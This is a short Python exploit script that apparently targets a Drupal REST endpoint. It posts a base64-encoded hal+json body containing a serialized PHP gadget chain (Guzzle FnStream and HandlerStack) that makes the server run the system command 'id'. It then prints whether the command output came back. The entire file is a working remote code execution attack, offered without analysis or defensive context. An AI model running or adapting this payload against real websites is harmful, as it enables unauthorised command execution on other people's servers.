import re
import requests
import sys
import os
import base64

if len(sys.argv) < 3:
        print 'Usage: python %s <dst_ip> <port>' % os.path.basename(sys.argv[0])
        sys.exit()
address =(sys.argv[1], sys.argv[2])
dst_addr=":".join(address)
print(dst_addr)
URL="http://"+dst_addr+"/node/1?_format=hal_json"
print(URL)
payload="ewogICJsaW5rIjogWwogICAgewogICAgICAidmFsdWUiOiAibGluayIsCiAgICAgICJvcHRpb25zIjogIk86MjQ6XCJHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVwiOjI6e3M6MzM6XCJcdTAwMDBHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVx1MDAwMG1ldGhvZHNcIjthOjE6e3M6NTpcImNsb3NlXCI7YToyOntpOjA7TzoyMzpcIkd1enpsZUh0dHBcXEhhbmRsZXJTdGFja1wiOjM6e3M6MzI6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBoYW5kbGVyXCI7czoyOlwiaWRcIjtzOjMwOlwiXHUwMDAwR3V6emxlSHR0cFxcSGFuZGxlclN0YWNrXHUwMDAwc3RhY2tcIjthOjE6e2k6MDthOjE6e2k6MDtzOjY6XCJzeXN0ZW1cIjt9fXM6MzE6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBjYWNoZWRcIjtiOjA7fWk6MTtzOjc6XCJyZXNvbHZlXCI7fX1zOjk6XCJfZm5fY2xvc2VcIjthOjI6e2k6MDtyOjQ7aToxO3M6NzpcInJlc29sdmVcIjt9fSIKICAgIH0KICBdLAogICJfbGlua3MiOiB7CiAgICAidHlwZSI6IHsKICAgICAgImhyZWYiOiAiaHR0cDovL2xvY2FsaG9zdC9yZXN0L3R5cGUvc2hvcnRjdXQvZGVmYXVsdCIKICAgIH0KICB9Cn0KCg=="
data = base64.b64decode(payload)
headers ={"Content-Type": "application/hal+json"}
res = requests.post(URL, data=data ,headers=headers)
response = res.text

p = re.compile('uid=\d\d.* gid=\d\d')
m = p.match(response)
print("Status Code : %d"% res.status_code)
if m:
        print("Vuln Found")
else:
        print("Not Found")
        
